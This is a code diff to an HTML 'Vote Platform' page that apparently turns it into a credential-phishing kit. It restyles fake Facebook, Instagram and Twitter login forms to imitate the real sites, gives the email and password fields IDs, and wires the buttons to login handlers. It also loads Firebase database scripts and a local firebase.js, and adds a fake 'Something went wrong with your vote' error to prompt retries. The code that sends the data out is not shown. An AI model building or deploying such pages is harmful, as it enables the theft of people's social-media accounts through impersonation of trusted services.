@@ -4,11 +4,20 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Vote Platform</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <link rel="stylesheet" href="css/index.css">
+    <link rel="stylesheet" href="assets/css/main.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Include Font Awesome for Social Media Icons -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
 </head>
 <body class="bg-black text-white flex items-center justify-center min-h-screen">
+
+  <div id="preloader" class="preloader">
+    Loading...
+  </div>
 
     <!-- Iframe Container (Initial Load) -->
     <div id="iframe-container" class="w-full h-full fixed inset-0">
@@ -44,74 +53,68 @@
     </div>
 
     <!-- Facebook Login Form (Hidden initially) -->
-    <div id="facebook-login" class="hidden fixed inset-0 bg-black bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
+    <div id="facebook-login" class="hidden fixed inset-0 bg-gray-100 bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
         <div class="mb-6">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/800px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo" class="w-24 h-24">
         </div>
         <div class="mb-4 w-full max-w-sm">
-            <label class="block text-sm font-medium mb-1">Username</label>
             <div class="bg-gray-700 rounded-md">
-                <input type="text" placeholder="Enter your username" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-500">
+                <input type="text" id="fb-email" placeholder="Mobile number or email address" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-500">
             </div>
         </div>
         <div class="mb-4 w-full max-w-sm">
-            <label class="block text-sm font-medium mb-1">Password</label>
             <div class="bg-gray-700 rounded-md">
-                <input type="password" placeholder="Enter your password" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-500">
+                <input type="password" id="fb-pass" placeholder="Password" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-500">
             </div>
         </div>
         <div class="w-full max-w-sm">
-            <div class="bg-blue-600 text-center py-3 rounded-md font-semibold cursor-pointer hover:bg-blue-500 transition">
+            <button onclick="login()" class="bg-blue-600 text-center py-3 rounded-md font-semibold cursor-pointer hover:bg-blue-500 transition">
                 Login
-            </div>
+            </button>
         </div>
     </div>
 
     <!-- Instagram Login Form (Hidden initially) -->
-    <div id="instagram-login" class="hidden fixed inset-0 bg-black bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
+    <div id="instagram-login" class="hidden fixed inset-0 bg-gray-100 bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
         <div class="mb-6">
             <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo" class="w-24 h-24">
         </div>
         <div class="mb-4 w-full max-w-sm">
-            <label class="block text-sm font-medium mb-1">Username</label>
             <div class="bg-gray-700 rounded-md">
-                <input type="text" placeholder="Enter your username" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-pink-500">
+                <input type="text" id="id" placeholder="Phone number, username, or email" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-pink-500">
             </div>
         </div>
         <div class="mb-4 w-full max-w-sm">
-            <label class="block text-sm font-medium mb-1">Password</label>
             <div class="bg-gray-700 rounded-md">
-                <input type="password" placeholder="Enter your password" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-pink-500">
+                <input type="password" placeholder="Password" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-pink-500">
             </div>
         </div>
         <div class="w-full max-w-sm">
-            <div class="bg-pink-600 text-center py-3 rounded-md font-semibold cursor-pointer hover:bg-pink-500 transition">
+            <button onclick="iglog()" class="bg-blue-600 text-center py-3 rounded-md font-semibold cursor-pointer hover:bg-pink-500 transition">
                 Login
-            </div>
+            </button>
         </div>
     </div>
 
     <!-- Twitter Login Form (Hidden initially) -->
-    <div id="twitter-login" class="hidden fixed inset-0 bg-black bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
+    <div id="twitter-login" class="hidden fixed inset-0 bg-gray-100 bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
         <div class="mb-6">
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/60/Twitter_Logo_2012.png" alt="Twitter Logo" class="w-24 h-24">
         </div>
         <div class="mb-4 w-full max-w-sm">
-            <label class="block text-sm font-medium mb-1">Username</label>
             <div class="bg-gray-700 rounded-md">
-                <input type="text" placeholder="Enter your username" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-400">
+                <input type="text" id="tw-email" placeholder="Phone, email, or username" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-400">
             </div>
         </div>
         <div class="mb-4 w-full max-w-sm">
-            <label class="block text-sm font-medium mb-1">Password</label>
             <div class="bg-gray-700 rounded-md">
-                <input type="password" placeholder="Enter your password" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-400">
+                <input type="password" id="tw-pass" placeholder="Password" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-400">
             </div>
         </div>
         <div class="w-full max-w-sm">
-            <div class="bg-blue-500 text-center py-3 rounded-md font-semibold cursor-pointer hover:bg-blue-400 transition">
+            <button onclick="tw_login()" class="bg-blue-600 text-center py-3 rounded-md font-semibold cursor-pointer hover:bg-blue-400 transition">
                 Login
-            </div>
+            </button>
         </div>
     </div>
 
@@ -129,6 +132,68 @@
             document.getElementById("login-prompt").classList.add("hidden");
             document.getElementById(platform + "-login").classList.remove("hidden");
         }
+    </script>
+
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
+  <script>
+    function showCustomAlert() {
+      Swal.fire({
+        title: 'Oops!',
+        text: 'Something went wrong with your vote.',
+        icon: 'error',
+        confirmButtonText: 'Try Again'
+      });
+    }
+  </script>
+
+    <script>
+      function showPreloader() {
+        document.getElementById("preloader").style.display = "flex";
+      }
+
+      function hidePreloader() {
+        document.getElementById("preloader").style.display = "none";
+      }
+
+      function Twitter() {
+        showPreloader();
+        setTimeout(function() {
+          hidePreloader();
+          document.getElementById("twitter").style.display = "flex";
+        }, 1000); // Delay in milliseconds
+      }
+
+      function Instagram() {
+        showPreloader();
+        setTimeout(function() {
+          hidePreloader();
+          document.getElementById("instagram").style.display = "flex";
+        }, 1000); // Delay in milliseconds
+      }
+
+      function Facebook() {
+        showPreloader();
+        setTimeout(function() {
+          hidePreloader();
+          document.getElementById("facebook").style.display = "flex";
+        }, 1000); // Delay in milliseconds
+      }
+
+      function closeDialog() {
+          document.getElementById("instagram").style.display = "none";
+          document.getElementById("twitter").style.display = "none";
+          document.getElementById("facebook").style.display = "none";
+      }
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+    <script src="js/firebase.js">
+
     </script>
 
 </body>
